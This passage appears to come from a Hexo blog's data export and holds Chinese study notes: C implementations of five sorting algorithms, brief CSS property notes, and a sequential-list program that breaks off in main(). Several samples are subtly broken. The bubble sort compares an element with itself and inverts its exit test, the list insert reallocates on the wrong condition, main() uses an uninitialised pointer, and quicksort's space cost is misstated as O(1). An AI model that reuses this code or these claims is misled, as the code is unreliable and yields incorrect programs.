title=\"二、希尔排序\"></a>二、希尔排序</h2><p>又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">ShellSort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> increasement;    <span class=\"hljs-comment\">//增量</span><br><br>    <span class=\"hljs-keyword\">for</span>(increasement=num/<span class=\"hljs-number\">2</span>;increasement&gt;<span class=\"hljs-number\">0</span>;increasement=increasement/<span class=\"hljs-number\">2</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(index1=increasement+<span class=\"hljs-number\">1</span>;index1&lt;=num;index1++)<br>        &#123;<br>            R[<span class=\"hljs-number\">0</span>]=R[index1];<br>            index2=index1-increasement;<br>            <span class=\"hljs-keyword\">while</span>(index2&gt;=<span class=\"hljs-number\">0</span>&amp;&amp;R[<span class=\"hljs-number\">0</span>].key&lt;R[index2].key)<br>            &#123;<br>                R[index2+increasement]=R[index2];<br>                index2=index2-increasement;<br>            &#125;<br>            R[index2+increasement]=R[<span class=\"hljs-number\">0</span>];<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；</p>\n<h2 id=\"三、冒泡排序\"><a href=\"#三、冒泡排序\" class=\"headerlink\" title=\"三、冒泡排序\"></a>三、冒泡排序</h2><p>每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">BubbleSort</span><span class=\"hljs-params\">(RecordType r[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> isExchange;<br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">1</span>;index1&lt;num;index1++)<br>    &#123;<br>        isExchange=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">for</span>(index2=<span class=\"hljs-number\">1</span>;index2&lt;=num<span class=\"hljs-number\">-1</span>;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(r[index2].key&gt;r[index2].key)<br>            &#123;<br>                r[<span class=\"hljs-number\">0</span>]=r[index2+<span class=\"hljs-number\">1</span>];<br>                r[index2+<span class=\"hljs-number\">1</span>]=r[index2];<br>                r[index2]=r[<span class=\"hljs-number\">0</span>];<br>                isExchange=<span class=\"hljs-number\">1</span>;<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(isExchange)<br>        &#123;<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>时间复杂度O（n^2）,空间复杂度O（1），稳定的；</p>\n<h2 id=\"四、快速排序\"><a href=\"#四、快速排序\" class=\"headerlink\" title=\"四、快速排序\"></a>四、快速排序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">Partition</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> low,<span class=\"hljs-type\">int</span> high)</span><br>&#123;<br>    R[<span class=\"hljs-number\">0</span>]=R[low];<br>    <span class=\"hljs-keyword\">while</span>(low&lt;high)<br>    &#123;<br>        <span class=\"hljs-keyword\">while</span>(low&lt;high&amp;&amp;R[high].key&gt;=R[<span class=\"hljs-number\">0</span>].key)<br>        &#123;<br>            --high;<br>        &#125;<br>        R[low]=R[high];<br>        <span class=\"hljs-keyword\">while</span>(low&lt;high&amp;&amp;R[low].key&lt;=R[<span class=\"hljs-number\">0</span>].key)<br>        &#123;<br>            ++low;<br>        &#125;<br>        R[high]=R[low];<br>    &#125;<br>    R[low]=R[<span class=\"hljs-number\">0</span>];<br>    <span class=\"hljs-keyword\">return</span> low;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Quicksort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> low,<span class=\"hljs-type\">int</span> high)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> loc;<br>    <span class=\"hljs-keyword\">if</span>(low&lt;high)<br>    &#123;<br>        loc=Partition(R,low,high); <br>        Quicksort(R,low,loc<span class=\"hljs-number\">-1</span>);<br>        Quicksort(R,loc+<span class=\"hljs-number\">1</span>,high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>空间复杂度O(1),时间复杂度O（n^2）</p>\n<h2 id=\"五、折半插入排序\"><a href=\"#五、折半插入排序\" class=\"headerlink\" title=\"五、折半插入排序\"></a>五、折半插入排序</h2><p>使用直接插入排序，使用折半查找需要插入的位置；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">BinarySort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> lowPoint,highPoint,midPoint;<br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">1</span>;index1&lt;=num;index1++)<br>    &#123;<br>        R[<span class=\"hljs-number\">0</span>]=R[index1];<br>        lowPoint=<span class=\"hljs-number\">1</span>;<br>        highPoint=index1<span class=\"hljs-number\">-1</span>;<br>        <span class=\"hljs-keyword\">while</span>(lowPoint&lt;=highPoint)<br>        &#123;<br>            midPoint=(lowPoint+highPoint)/<span class=\"hljs-number\">2</span>;<br>            <span class=\"hljs-keyword\">if</span>(R[<span class=\"hljs-number\">0</span>].key&lt;R[midPoint].key)<br>            &#123;<br>                highPoint=midPoint<span class=\"hljs-number\">-1</span>;<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                lowPoint=midPoint+<span class=\"hljs-number\">1</span>;<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">for</span>(index2=index1<span class=\"hljs-number\">-1</span>;index2&gt;=highPoint+<span class=\"hljs-number\">1</span>;--index2)<br>        &#123;<br>            R[index2+<span class=\"hljs-number\">1</span>]=R[index2];<br>        &#125;<br>        R[highPoint+<span class=\"hljs-number\">1</span>]=R[<span class=\"hljs-number\">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"排序算法\"><a href=\"#排序算法\" class=\"headerlink\" title=\"排序算法\"></a>排序算法</h1><h2 id=\"一、插入排序\"><a href=\"#一、插入排序\" class=\"headerlink\" title=\"一、插入排序\"></a>一、插入排序</h2><p>每次将一个待排序的记录插入到前面已经排序的序列；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">InsertSort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br><br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">2</span>;index1&lt;=num;index1++)<br>    &#123;<br>       R[<span class=\"hljs-number\">0</span>]=R[index1];<br>       index2=index1<span class=\"hljs-number\">-1</span>;<br>       <span class=\"hljs-keyword\">while</span>(R[<span class=\"hljs-number\">0</span>].key&lt;R[index2].key)<br>       &#123;<br>           R[index2+<span class=\"hljs-number\">1</span>]=R[index2];<br>           index2--;<br>           R[index2+<span class=\"hljs-number\">1</span>]=R[<span class=\"hljs-number\">0</span>];<br>       &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>适用于一个基本有序的序列，n^2,稳定的；</p>\n<h2 id=\"二、希尔排序\"><a href=\"#二、希尔排序\" class=\"headerlink\" title=\"二、希尔排序\"></a>二、希尔排序</h2><p>又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">ShellSort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> increasement;    <span class=\"hljs-comment\">//增量</span><br><br>    <span class=\"hljs-keyword\">for</span>(increasement=num/<span class=\"hljs-number\">2</span>;increasement&gt;<span class=\"hljs-number\">0</span>;increasement=increasement/<span class=\"hljs-number\">2</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(index1=increasement+<span class=\"hljs-number\">1</span>;index1&lt;=num;index1++)<br>        &#123;<br>            R[<span class=\"hljs-number\">0</span>]=R[index1];<br>            index2=index1-increasement;<br>            <span class=\"hljs-keyword\">while</span>(index2&gt;=<span class=\"hljs-number\">0</span>&amp;&amp;R[<span class=\"hljs-number\">0</span>].key&lt;R[index2].key)<br>            &#123;<br>                R[index2+increasement]=R[index2];<br>                index2=index2-increasement;<br>            &#125;<br>            R[index2+increasement]=R[<span class=\"hljs-number\">0</span>];<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；</p>\n<h2 id=\"三、冒泡排序\"><a href=\"#三、冒泡排序\" class=\"headerlink\" title=\"三、冒泡排序\"></a>三、冒泡排序</h2><p>每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">BubbleSort</span><span class=\"hljs-params\">(RecordType r[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> isExchange;<br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">1</span>;index1&lt;num;index1++)<br>    &#123;<br>        isExchange=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">for</span>(index2=<span class=\"hljs-number\">1</span>;index2&lt;=num<span class=\"hljs-number\">-1</span>;index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(r[index2].key&gt;r[index2].key)<br>            &#123;<br>                r[<span class=\"hljs-number\">0</span>]=r[index2+<span class=\"hljs-number\">1</span>];<br>                r[index2+<span class=\"hljs-number\">1</span>]=r[index2];<br>                r[index2]=r[<span class=\"hljs-number\">0</span>];<br>                isExchange=<span class=\"hljs-number\">1</span>;<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(isExchange)<br>        &#123;<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>时间复杂度O（n^2）,空间复杂度O（1），稳定的；</p>\n<h2 id=\"四、快速排序\"><a href=\"#四、快速排序\" class=\"headerlink\" title=\"四、快速排序\"></a>四、快速排序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">Partition</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> low,<span class=\"hljs-type\">int</span> high)</span><br>&#123;<br>    R[<span class=\"hljs-number\">0</span>]=R[low];<br>    <span class=\"hljs-keyword\">while</span>(low&lt;high)<br>    &#123;<br>        <span class=\"hljs-keyword\">while</span>(low&lt;high&amp;&amp;R[high].key&gt;=R[<span class=\"hljs-number\">0</span>].key)<br>        &#123;<br>            --high;<br>        &#125;<br>        R[low]=R[high];<br>        <span class=\"hljs-keyword\">while</span>(low&lt;high&amp;&amp;R[low].key&lt;=R[<span class=\"hljs-number\">0</span>].key)<br>        &#123;<br>            ++low;<br>        &#125;<br>        R[high]=R[low];<br>    &#125;<br>    R[low]=R[<span class=\"hljs-number\">0</span>];<br>    <span class=\"hljs-keyword\">return</span> low;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Quicksort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> low,<span class=\"hljs-type\">int</span> high)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> loc;<br>    <span class=\"hljs-keyword\">if</span>(low&lt;high)<br>    &#123;<br>        loc=Partition(R,low,high); <br>        Quicksort(R,low,loc<span class=\"hljs-number\">-1</span>);<br>        Quicksort(R,loc+<span class=\"hljs-number\">1</span>,high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>空间复杂度O(1),时间复杂度O（n^2）</p>\n<h2 id=\"五、折半插入排序\"><a href=\"#五、折半插入排序\" class=\"headerlink\" title=\"五、折半插入排序\"></a>五、折半插入排序</h2><p>使用直接插入排序，使用折半查找需要插入的位置；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">BinarySort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br>    <span class=\"hljs-type\">int</span> lowPoint,highPoint,midPoint;<br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">1</span>;index1&lt;=num;index1++)<br>    &#123;<br>        R[<span class=\"hljs-number\">0</span>]=R[index1];<br>        lowPoint=<span class=\"hljs-number\">1</span>;<br>        highPoint=index1<span class=\"hljs-number\">-1</span>;<br>        <span class=\"hljs-keyword\">while</span>(lowPoint&lt;=highPoint)<br>        &#123;<br>            midPoint=(lowPoint+highPoint)/<span class=\"hljs-number\">2</span>;<br>            <span class=\"hljs-keyword\">if</span>(R[<span class=\"hljs-number\">0</span>].key&lt;R[midPoint].key)<br>            &#123;<br>                highPoint=midPoint<span class=\"hljs-number\">-1</span>;<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                lowPoint=midPoint+<span class=\"hljs-number\">1</span>;<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">for</span>(index2=index1<span class=\"hljs-number\">-1</span>;index2&gt;=highPoint+<span class=\"hljs-number\">1</span>;--index2)<br>        &#123;<br>            R[index2+<span class=\"hljs-number\">1</span>]=R[index2];<br>        &#125;<br>        R[highPoint+<span class=\"hljs-number\">1</span>]=R[<span class=\"hljs-number\">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n"},{"title":"CSS笔记","date":"2020-12-03T13:18:45.000Z","mp3":null,"cover":"img/welcome-cover2.jpg","_content":"\n\n1.向 div 元素添加阴影\n\nbox-shadow: 20px 10px 5px pink;\n\n参数：长 宽 颜色\n\n2.display\n\n| none         | 此元素不会被显示。                                   |\n| ------------ | ---------------------------------------------------- |\n| block        | 此元素将显示为块级元素，此元素前后会带有换行符。     |\n| inline       | 默认。此元素会被显示为内联元素，元素前后没有换行符。 |\n| inline-block | 行内块元素。（CSS2.1 新增的值）                      |\n\n3.border-redius\n\n给div元素添加圆角的边框\n\n4.outline\n\n设置元素周围的轮廓\n\n| 值              | 描述                                                         |\n| :-------------- | :----------------------------------------------------------- |\n| *outline-color* | 规定边框的颜色。参阅：[outline-color](https://www.runoob.com/cssref/pr-outline-color.html) 中可能的值。 |\n| *outline-style* | 规定边框的样式。参阅：[outline-style](https://www.runoob.com/cssref/pr-outline-style.html) 中可能的值。 |\n| *outline-width* | 规定边框的宽度。参阅：[outline-width](https://www.runoob.com/cssref/pr-outline-width.html) 中可能的值。 |\n| inherit         | 规定应该从父元素继承 outline 属性的设置。                    |\n\n5.a:active 激活后样式\n{\nbackground-color:yellow;\n}","source":"_posts/CSS特性.md","raw":"---\ntitle: CSS笔记\ndate: 2020-12-3 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/welcome-cover2.jpg\n---\n\n\n1.向 div 元素添加阴影\n\nbox-shadow: 20px 10px 5px pink;\n\n参数：长 宽 颜色\n\n2.display\n\n| none         | 此元素不会被显示。                                   |\n| ------------ | ---------------------------------------------------- |\n| block        | 此元素将显示为块级元素，此元素前后会带有换行符。     |\n| inline       | 默认。此元素会被显示为内联元素，元素前后没有换行符。 |\n| inline-block | 行内块元素。（CSS2.1 新增的值）                      |\n\n3.border-redius\n\n给div元素添加圆角的边框\n\n4.outline\n\n设置元素周围的轮廓\n\n| 值              | 描述                                                         |\n| :-------------- | :----------------------------------------------------------- |\n| *outline-color* | 规定边框的颜色。参阅：[outline-color](https://www.runoob.com/cssref/pr-outline-color.html) 中可能的值。 |\n| *outline-style* | 规定边框的样式。参阅：[outline-style](https://www.runoob.com/cssref/pr-outline-style.html) 中可能的值。 |\n| *outline-width* | 规定边框的宽度。参阅：[outline-width](https://www.runoob.com/cssref/pr-outline-width.html) 中可能的值。 |\n| inherit         | 规定应该从父元素继承 outline 属性的设置。                    |\n\n5.a:active 激活后样式\n{\nbackground-color:yellow;\n}","slug":"CSS特性","published":1,"updated":"2020-12-03T11:56:24.000Z","_id":"clg29vyfr0008ao9c1g3ohndz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1.向 div 元素添加阴影</p>\n<p>box-shadow: 20px 10px 5px pink;</p>\n<p>参数：长 宽 颜色</p>\n<p>2.display</p>\n<table>\n<thead>\n<tr>\n<th>none</th>\n<th>此元素不会被显示。</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>block</td>\n<td>此元素将显示为块级元素，此元素前后会带有换行符。</td>\n</tr>\n<tr>\n<td>inline</td>\n<td>默认。此元素会被显示为内联元素，元素前后没有换行符。</td>\n</tr>\n<tr>\n<td>inline-block</td>\n<td>行内块元素。（CSS2.1 新增的值）</td>\n</tr>\n</tbody></table>\n<p>3.border-redius</p>\n<p>给div元素添加圆角的边框</p>\n<p>4.outline</p>\n<p>设置元素周围的轮廓</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">值</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><em>outline-color</em></td>\n<td align=\"left\">规定边框的颜色。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-color.html\">outline-color</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>outline-style</em></td>\n<td align=\"left\">规定边框的样式。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-style.html\">outline-style</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>outline-width</em></td>\n<td align=\"left\">规定边框的宽度。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-width.html\">outline-width</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\">inherit</td>\n<td align=\"left\">规定应该从父元素继承 outline 属性的设置。</td>\n</tr>\n</tbody></table>\n<p>5.a:active 激活后样式<br>{<br>background-color:yellow;<br>}</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.向 div 元素添加阴影</p>\n<p>box-shadow: 20px 10px 5px pink;</p>\n<p>参数：长 宽 颜色</p>\n<p>2.display</p>\n<table>\n<thead>\n<tr>\n<th>none</th>\n<th>此元素不会被显示。</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>block</td>\n<td>此元素将显示为块级元素，此元素前后会带有换行符。</td>\n</tr>\n<tr>\n<td>inline</td>\n<td>默认。此元素会被显示为内联元素，元素前后没有换行符。</td>\n</tr>\n<tr>\n<td>inline-block</td>\n<td>行内块元素。（CSS2.1 新增的值）</td>\n</tr>\n</tbody></table>\n<p>3.border-redius</p>\n<p>给div元素添加圆角的边框</p>\n<p>4.outline</p>\n<p>设置元素周围的轮廓</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">值</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><em>outline-color</em></td>\n<td align=\"left\">规定边框的颜色。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-color.html\">outline-color</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>outline-style</em></td>\n<td align=\"left\">规定边框的样式。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-style.html\">outline-style</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>outline-width</em></td>\n<td align=\"left\">规定边框的宽度。参阅：<a href=\"https://www.runoob.com/cssref/pr-outline-width.html\">outline-width</a> 中可能的值。</td>\n</tr>\n<tr>\n<td align=\"left\">inherit</td>\n<td align=\"left\">规定应该从父元素继承 outline 属性的设置。</td>\n</tr>\n</tbody></table>\n<p>5.a:active 激活后样式<br>{<br>background-color:yellow;<br>}</p>\n"},{"title":"关于C语言的一些奇奇怪怪","date":"2021-08-08T12:56:45.000Z","mp3":null,"cover":"img/2.jpg","_content":"\n```csharp\n#include <stdio.h>\n#include <stdlib.h>\n\n#define INIT_SIZE 5\n#define INCREMENT 2\n\ntypedef int ElemType;\ntypedef struct{\n    ElemType *data;\n    int length;\n    int list_length;\n}SqList;\n\nint InitList_Sq(SqList *L)\n{\n    L->data=(ElemType *)malloc(INIT_SIZE*sizeof(ElemType));\n    if(!L->data){\n        return -1;\n    }\n    L->length=0;\n    L->list_length=INIT_SIZE;\n    return 1;\n}\n\nint ListInsert(SqList *L,int index,ElemType temp_data)\n{\n    int j;\n    ElemType *newBase;\n    if(index<0 || index>L->length)\n    {\n        //realloc重新分配\n        newBase=(ElemType *)realloc(L->data,(L->list_length+INCREMENT)*sizeof(ElemType));\n        if(!newBase)\n        {\n            return -1;\n        }\n        L->data=newBase;\n        L->list_length+=INCREMENT;\n    }\n    for(j=L->length-1;j>=index;j--)\n    {\n        L->data[j+1]=L->data[j];\n    }\n    L->data[index]=temp_data;\n    L->length++;\n    return 1;\n}\n\nint DeleteList(SqList *L,int pos)\n{\n    if(pos<0||pos>L->length)\n    {\n        printf(\"Wrong position.\\n\");\n        return 0;\n    }\n    for(int index=pos;index<L->length;index++)\n    {\n        L->data[index]=L->data[index+1];\n    }\n    L->length--;\n    return 1;\n}\n\nint FindElem(SqList *L,ElemType target)\n{\n    if(!L->data)\n    {\n        printf(\"Empty table.\\n\");\n        return -1;\n    }\n    for(int index=0;index<L->length;index++)\n    {\n        if(target==L->data[index])\n        {\n            printf(\"Find at %d.\\n\",index);\n            return index;\n        }\n    }\n    printf(\"No such a data.\\n\");\n    return -1;\n}\n\nvoid PrintList(SqList *L)\n{\n    for(int index=0;index<L->length;index++)\n    {\n        printf(\"%d \",L->data[index]);\n    }\n    printf(\"\\n\");\n}\n\n\nint main()\n{\n    SqList *Mylist;\n    InitList_Sq(Mylist);\n\n    